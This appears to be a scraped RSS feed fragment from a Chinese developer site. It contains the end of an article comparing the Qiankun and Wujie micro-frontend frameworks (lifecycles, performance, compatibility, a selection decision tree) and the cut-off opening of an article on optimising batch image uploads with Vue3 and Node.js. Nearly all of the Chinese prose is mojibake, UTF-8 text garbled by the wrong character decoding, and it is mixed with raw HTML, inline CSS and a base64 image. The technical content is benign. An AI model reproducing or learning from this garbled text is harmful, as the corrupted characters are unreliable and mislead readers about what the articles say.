<table><thead><tr><th>ç‰¹æ€§</th><th>Qiankun</th><th>Wujie</th></tr></thead><tbody><tr><td>ç”Ÿå‘½å‘¨æœŸé’©å­</td><td>âœ…</td><td>âœ…</td></tr><tr><td>JS Loader</td><td>âŒ</td><td>âœ…</td></tr><tr><td>CSS Loader</td><td>âŒ</td><td>âœ…</td></tr><tr><td>èµ„æºæ’é™¤/å¿½ç•¥</td><td>âŒ</td><td>âœ…</td></tr><tr><td>å‰ç½®/åç½®è„šæœ¬</td><td>âŒ</td><td>âœ…</td></tr><tr><td>äº‹ä»¶æ‹¦æˆª</td><td>âŒ</td><td>âœ…</td></tr><tr><td>DOM æ‹¦æˆª</td><td>âŒ</td><td>âœ…</td></tr><tr><td>å±æ€§è¦†ç›–</td><td>âŒ</td><td>âœ…</td></tr></tbody></table>
<h3 data-id="heading-31">ä¹ã€ç”Ÿå‘½å‘¨æœŸ</h3>
<h4 data-id="heading-32">9.1 Qiankun ç”Ÿå‘½å‘¨æœŸ</h4>
<pre><code class="hljs language-erlang" lang="erlang">beforeLoad â†’ bootstrap â†’ beforeMount â†’ mount â†’ <span class="hljs-keyword">after</span>Mount
                              â†“
                    beforeUnmount â†’ unmount â†’ <span class="hljs-keyword">after</span>Unmount
</code></pre>
<p>å­åº”ç”¨å¿…é¡»å¯¼å‡ºï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">bootstrap</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">mount</span>(<span class="hljs-params">props</span>) {}
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">unmount</span>(<span class="hljs-params">props</span>) {}
</code></pre>
<h4 data-id="heading-33">9.2 Wujie ç”Ÿå‘½å‘¨æœŸ</h4>
<pre><code class="hljs language-erlang" lang="erlang">beforeLoad â†’ active â†’ start â†’ beforeMount â†’ mount â†’ <span class="hljs-keyword">after</span>Mount
                                    â†“
                          beforeUnmount â†’ unmount â†’ <span class="hljs-keyword">after</span>Unmount
</code></pre>
<p>å­åº”ç”¨å¯é€‰å¯¼å‡ºï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">__WUJIE_MOUNT</span> = <span class="hljs-function">() =&gt;</span> {};
<span class="hljs-variable language_">window</span>.<span class="hljs-property">__WUJIE_UNMOUNT</span> = <span class="hljs-function">() =&gt;</span> {};
</code></pre>
<h4 data-id="heading-34">9.3 ç”Ÿå‘½å‘¨æœŸå¯¹æ¯”</h4>






























<table><thead><tr><th>ç‰¹æ€§</th><th>Qiankun</th><th>Wujie</th></tr></thead><tbody><tr><td>å¿…é¡»å¯¼å‡º</td><td>âœ… å¿…é¡»</td><td>âŒ å¯é€‰</td></tr><tr><td>æ”¹é€ æˆæœ¬</td><td>ä¸­</td><td>ä½</td></tr><tr><td>ç‹¬ç«‹è¿è¡Œ</td><td>éœ€åˆ¤æ–­ <code>__POWERED_BY_QIANKUN__</code></td><td>è‡ªåŠ¨å…¼å®¹</td></tr><tr><td>ç”Ÿå‘½å‘¨æœŸæ•°é‡</td><td>5 ä¸ª</td><td>6 ä¸ª</td></tr></tbody></table>
<h3 data-id="heading-35">åã€æ€§èƒ½å¯¹æ¯”</h3>



































<table><thead><tr><th>ç»´åº¦</th><th>Qiankun</th><th>Wujie</th></tr></thead><tbody><tr><td>é¦–æ¬¡åŠ è½½</td><td>å¿«</td><td>ç¨æ…¢ï¼ˆåˆ›å»º iframeï¼‰</td></tr><tr><td>åˆ‡æ¢é€Ÿåº¦</td><td>å¿«</td><td>å¿«ï¼ˆä¿æ´»æ¨¡å¼æ›´å¿«ï¼‰</td></tr><tr><td>å†…å­˜å ç”¨</td><td>ä½</td><td>ä¸­ï¼ˆiframe å¼€é”€ï¼‰</td></tr><tr><td>æ²™ç®±åˆ›å»º</td><td>å¿«ï¼ˆProxyï¼‰</td><td>ç¨æ…¢ï¼ˆiframeï¼‰</td></tr><tr><td>æ ·å¼éš”ç¦»å¼€é”€</td><td>ä½ï¼ˆScopedï¼‰/ ä¸­ï¼ˆShadowï¼‰</td><td>ä¸­ï¼ˆShadowï¼‰</td></tr></tbody></table>
<h3 data-id="heading-36">åä¸€ã€å…¼å®¹æ€§</h3>






























<table><thead><tr><th>ç‰¹æ€§</th><th>Qiankun</th><th>Wujie</th></tr></thead><tbody><tr><td>IE æ”¯æŒ</td><td>âŒ éœ€ Proxy polyfill</td><td>âŒ</td></tr><tr><td>æœ€ä½æµè§ˆå™¨</td><td>Chrome 49+</td><td>Chrome 53+</td></tr><tr><td>Web Components</td><td>å¯é€‰</td><td>å¿…éœ€ï¼ˆæœ‰é™çº§ï¼‰</td></tr><tr><td>Proxy</td><td>å¿…éœ€</td><td>å¿…éœ€</td></tr></tbody></table>
<h3 data-id="heading-37">åäºŒã€é€‰å‹å»ºè®®</h3>
<pre><code class="hljs">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        é€‰å‹å†³ç­–æ ‘                                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚   éœ€è¦æè‡´ JS éš”ç¦»ï¼Ÿ                                             â”‚
â”‚       â”œâ”€â”€ æ˜¯ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ Wujie              â”‚
â”‚       â””â”€â”€ å¦ â”€â”€â–¶ ç»§ç»­åˆ¤æ–­                                        â”‚
â”‚                                                                  â”‚
â”‚   å­åº”ç”¨æ”¹é€ æˆæœ¬æ•æ„Ÿï¼Ÿ                                            â”‚
â”‚       â”œâ”€â”€ æ˜¯ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ Wujie              â”‚
â”‚       â””â”€â”€ å¦ â”€â”€â–¶ ç»§ç»­åˆ¤æ–­                                        â”‚
â”‚                                                                  â”‚
â”‚   éœ€è¦ä¿æ´»æ¨¡å¼ï¼ˆçŠ¶æ€ä¿ç•™ï¼‰ï¼Ÿ                                       â”‚
â”‚       â”œâ”€â”€ æ˜¯ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ Wujie              â”‚
â”‚       â””â”€â”€ å¦ â”€â”€â–¶ ç»§ç»­åˆ¤æ–­                                        â”‚
â”‚                                                                  â”‚
â”‚   ä½¿ç”¨ umi æ¡†æ¶ï¼Ÿ                                                â”‚
â”‚       â”œâ”€â”€ æ˜¯ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ Qiankun            â”‚
â”‚       â””â”€â”€ å¦ â”€â”€â–¶ ç»§ç»­åˆ¤æ–­                                        â”‚
â”‚                                                                  â”‚
â”‚   éœ€è¦æˆç†Ÿç”Ÿæ€å’Œç¤¾åŒºæ”¯æŒï¼Ÿ                                        â”‚
â”‚       â”œâ”€â”€ æ˜¯ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ Qiankun            â”‚
â”‚       â””â”€â”€ å¦ â”€â”€â–¶ ç»§ç»­åˆ¤æ–­                                        â”‚
â”‚                                                                  â”‚
â”‚   éœ€è¦ä¸°å¯Œçš„æ’ä»¶èƒ½åŠ›ï¼Ÿ                                            â”‚
â”‚       â”œâ”€â”€ æ˜¯ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ Wujie              â”‚
â”‚       â””â”€â”€ å¦ â”€â”€â–¶ éƒ½å¯ä»¥                                          â”‚
â”‚                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-38">é€‰æ‹© Qiankun çš„åœºæ™¯</h4>
<ul>
<li>umi é¡¹ç›®ï¼Œéœ€è¦æ·±åº¦é›†æˆ</li>
<li>å›¢é˜Ÿç†Ÿæ‚‰ single-spa ç”Ÿæ€</li>
<li>å¯¹éš”ç¦»è¦æ±‚ä¸æè‡´ï¼Œæ¥å— Proxy æ–¹æ¡ˆ</li>
<li>éœ€è¦æˆç†Ÿç¨³å®šçš„è§£å†³æ–¹æ¡ˆ</li>
<li>å­åº”ç”¨å¯ä»¥é…åˆæ”¹é€ </li>
</ul>
<h4 data-id="heading-39">é€‰æ‹© Wujie çš„åœºæ™¯</h4>
<ul>
<li>éœ€è¦æè‡´çš„ JS éš”ç¦»èƒ½åŠ›</li>
<li>å­åº”ç”¨æ”¹é€ æˆæœ¬è¦æ±‚ä½</li>
<li>éœ€è¦ä¿æ´»æ¨¡å¼ï¼ˆé¢‘ç¹åˆ‡æ¢åœºæ™¯ï¼‰</li>
<li>éœ€è¦ä¸°å¯Œçš„æ’ä»¶æ‰©å±•èƒ½åŠ›</li>
<li>éœ€è¦è·¯ç”±åŒæ­¥åˆ° URL</li>
</ul>
<h3 data-id="heading-40">åä¸‰ã€æ€»ç»“</h3>







































































<table><thead><tr><th>ç»´åº¦</th><th>Qiankun</th><th>Wujie</th><th>èƒœå‡º</th></tr></thead><tbody><tr><td>JS éš”ç¦»</td><td>Proxy æ¨¡æ‹Ÿ</td><td>iframe åŸç”Ÿ</td><td>Wujie</td></tr><tr><td>CSS éš”ç¦»</td><td>Scoped/Shadow</td><td>Shadow</td><td>å¹³æ‰‹</td></tr><tr><td>æ”¹é€ æˆæœ¬</td><td>ä¸­</td><td>ä½</td><td>Wujie</td></tr><tr><td>ç”Ÿæ€æˆç†Ÿåº¦</td><td>é«˜</td><td>ä¸­</td><td>Qiankun</td></tr><tr><td>æ’ä»¶èƒ½åŠ›</td><td>å¼±</td><td>å¼º</td><td>Wujie</td></tr><tr><td>é¢„åŠ è½½</td><td>ä¸°å¯Œ</td><td>åŸºç¡€</td><td>Qiankun</td></tr><tr><td>ä¿æ´»æ¨¡å¼</td><td>âŒ</td><td>âœ…</td><td>Wujie</td></tr><tr><td>è·¯ç”±åŒæ­¥</td><td>éœ€å¤„ç†</td><td>å†…ç½®</td><td>Wujie</td></tr><tr><td>å†…å­˜å ç”¨</td><td>ä½</td><td>ä¸­</td><td>Qiankun</td></tr><tr><td>ç¤¾åŒºæ”¯æŒ</td><td>å¼º</td><td>ä¸­</td><td>Qiankun</td></tr></tbody></table>
<p><strong>æœ€ç»ˆç»“è®º</strong>ï¼š</p>
<ul>
<li><strong>Qiankun</strong>ï¼šæˆç†Ÿç¨³å®šï¼Œç”Ÿæ€å®Œå–„ï¼Œæ˜¯åŸºäº single-spa çš„äº‹å®æ ‡å‡†ï¼Œé€‚åˆå¯¹ç¨³å®šæ€§è¦æ±‚é«˜ã€æœ‰ umi æŠ€æœ¯æ ˆçš„å›¢é˜Ÿ</li>
<li><strong>Wujie</strong>ï¼šéš”ç¦»å½»åº•ï¼Œæ”¹é€ æˆæœ¬ä½ï¼Œåˆ›æ–°çš„åŒå®¹å™¨æ¶æ„ï¼Œé€‚åˆå¯¹éš”ç¦»è¦æ±‚é«˜ã€éœ€è¦ä¿æ´»æ¨¡å¼ã€å­åº”ç”¨æ”¹é€ å—é™çš„åœºæ™¯</li>
</ul>
<p>ä¸¤ä¸ªæ¡†æ¶å„æœ‰åƒç§‹ï¼Œé€‰å‹æ—¶éœ€è¦æ ¹æ®é¡¹ç›®å®é™…æƒ…å†µï¼Œæƒè¡¡éš”ç¦»èƒ½åŠ›ã€æ”¹é€ æˆæœ¬ã€å›¢é˜Ÿç†Ÿæ‚‰åº¦ã€ç”Ÿæ€æ”¯æŒç­‰å› ç´ ç»¼åˆè€ƒè™‘ã€‚</p>
<hr/>
<blockquote>
<p>ğŸ“¦ æºç å‚è€ƒï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fumijs%2Fqiankun" target="_blank" title="https://github.com/umijs/qiankun" ref="nofollow noopener noreferrer">Qiankun GitHub</a> - åŸºäº v3.0 åˆ†æ</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTencent%2Fwujie" target="_blank" title="https://github.com/Tencent/wujie" ref="nofollow noopener noreferrer">Wujie GitHub</a> - åŸºäº v1.0.22 åˆ†æ</li>
</ul>
<p>ğŸ“š ç›¸å…³ä¸“æ ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=.%2Fqiankun%2F" target="_blank" title="./qiankun/" ref="nofollow noopener noreferrer">Qiankun æºç è§£æç³»åˆ—</a></li>
<li><a href="https://link.juejin.cn?target=.%2Fwujie%2F" target="_blank" title="./wujie/" ref="nofollow noopener noreferrer">Wujie æºç è§£æç³»åˆ—</a></li>
</ul>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é¢è¯•å®˜ï¼šå¦‚ä½•ä¼˜åŒ–æ‰¹é‡å›¾ç‰‡ä¸Šä¼ ï¼Ÿé˜Ÿåˆ—æœºåˆ¶+åˆ†ç‰‡å¤„ç†+æ–­ç‚¹ç»­ä¼ ä¸‰è¿å‡»ï¼]]></title>    <link>https://juejin.cn/post/7588999772750299171</link>    <guid>https://juejin.cn/post/7588999772750299171</guid>    <pubDate>2025-12-29T08:04:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588999772750299171" data-draft-id="7587336857539084297" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é¢è¯•å®˜ï¼šå¦‚ä½•ä¼˜åŒ–æ‰¹é‡å›¾ç‰‡ä¸Šä¼ ï¼Ÿé˜Ÿåˆ—æœºåˆ¶+åˆ†ç‰‡å¤„ç†+æ–­ç‚¹ç»­ä¼ ä¸‰è¿å‡»ï¼"/> <meta itemprop="keywords" content="å‰ç«¯,Node.js"/> <meta itemprop="datePublished" content="2025-12-29T08:04:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç‹å—¨çš®"/> <meta itemprop="url" content="https://juejin.cn/user/2137106336976183"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é¢è¯•å®˜ï¼šå¦‚ä½•ä¼˜åŒ–æ‰¹é‡å›¾ç‰‡ä¸Šä¼ ï¼Ÿé˜Ÿåˆ—æœºåˆ¶+åˆ†ç‰‡å¤„ç†+æ–­ç‚¹ç»­ä¼ ä¸‰è¿å‡»ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2137106336976183/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç‹å—¨çš®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T08:04:56.000Z" title="Mon Dec 29 2025 08:04:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ç‹å—¨çš®ï¼Œä¸€å<code>ä¸»ä¸šå‰ç«¯ï¼Œå‰¯ä¸šå…¨æ ˆ</code>çš„ç¨‹åºå‘˜ï¼Œåœ¨è¿™é‡Œæˆ‘ä¼šåˆ†äº«å…³äºæˆ‘å·¥ä½œä¸­æ¶‰åŠçš„<code>å‰ç«¯/å…¨æ ˆçš„å¸¸ç”¨æŠ€æœ¯</code>Â å¦‚æœæˆ‘çš„æ–‡ç« èƒ½è®©æ‚¨æœ‰æ‰€æ”¶è·ï¼Œæ¬¢è¿ä¸€é”®ä¸‰è¿ï¼ˆè¯„è®ºï¼Œç‚¹èµï¼Œå…³æ³¨ï¼‰ï¼Œæ„Ÿè°¢ï¼</p>
</blockquote>
<hr/>
<p>"ä½ åšè¿‡å›¾ç‰‡æ‰¹é‡ä¸Šä¼ å—ï¼Ÿè¯´è¯´ä½ æ˜¯æ€ä¹ˆä¼˜åŒ–çš„ã€‚"</p>
<p>æ¯æ¬¡é‡åˆ°è¿™ä¸ªé¢è¯•é—®é¢˜ï¼Œæ€»ä¸èƒ½å°¬ç­”ä¸€å¥"ç”¨äº†XXXç»„ä»¶åº“"ï¼Ÿå¤§å›¾å¡å¸¦å®½ã€å¤šå›¾ä¼ åŠå¤©ã€ç½‘ç»œä¸€æ–­ä»å¤´æ¥ã€å¹¶å‘ä¸€é«˜æœåŠ¡å™¨ç›´æ¥å´©â€”â€”è¿™äº›å‘ä½ è¸©è¿‡å‡ ä¸ªï¼Ÿ</p>
<p>è¿™ç¯‡æ–‡ç« åˆ†äº«ä¸€ä¸‹æˆ‘çš„Â Vue3 + Node.jsÂ å›¾ç‰‡æ‰¹é‡ä¸Šä¼ ä¼˜åŒ–æ–¹æ¡ˆï¼šä»å¹¶å‘æ§åˆ¶-&gt; å‹ç¼©-&gt; åˆ†ç‰‡-&gt; æ–­ç‚¹ç»­ä¼ ã€‚</p>
<p><strong>æ–¹æ¡ˆä¸­ä½¿ç”¨çš„æŠ€æœ¯</strong>ï¼š</p>
<p>Â· å‰ç«¯åŠä¾èµ–ï¼š<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fvuejs.org%2F" target="_blank" title="https://vuejs.org/" ref="nofollow noopener noreferrer">vue3</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fvite.dev%2F" target="_blank" title="https://vite.dev/" ref="nofollow noopener noreferrer">vite</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Felement-plus.org%2F" target="_blank" title="https://element-plus.org/" ref="nofollow noopener noreferrer">element-plus</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Faxios-http.com%2Fdocs%2Fintro" target="_blank" title="https://axios-http.com/docs/intro" ref="nofollow noopener noreferrer">axios</a></strong></p>
<p>Â· åç«¯åŠä¾èµ–ï¼š<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fen" target="_blank" title="https://nodejs.org/en" ref="nofollow noopener noreferrer">node</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fexpressjs.com%2F" target="_blank" title="https://expressjs.com/" ref="nofollow noopener noreferrer">express</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fexpressjs.com%2Fen%2Fresources%2Fmiddleware%2Fcors.html" target="_blank" title="https://expressjs.com/en/resources/middleware/cors.html" ref="nofollow noopener noreferrer">cors</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Ffs-extra" target="_blank" title="https://www.npmjs.com/package/fs-extra" ref="nofollow noopener noreferrer">fs-extra</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fnodemon" target="_blank" title="https://www.npmjs.com/package/nodemon" ref="nofollow noopener noreferrer">nodemon</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fmulter" target="_blank" title="https://www.npmjs.com/package/multer" ref="nofollow noopener noreferrer">multer</a></strong></p>
<p><strong>æ ¸å¿ƒæ€è·¯ï¼š</strong></p>
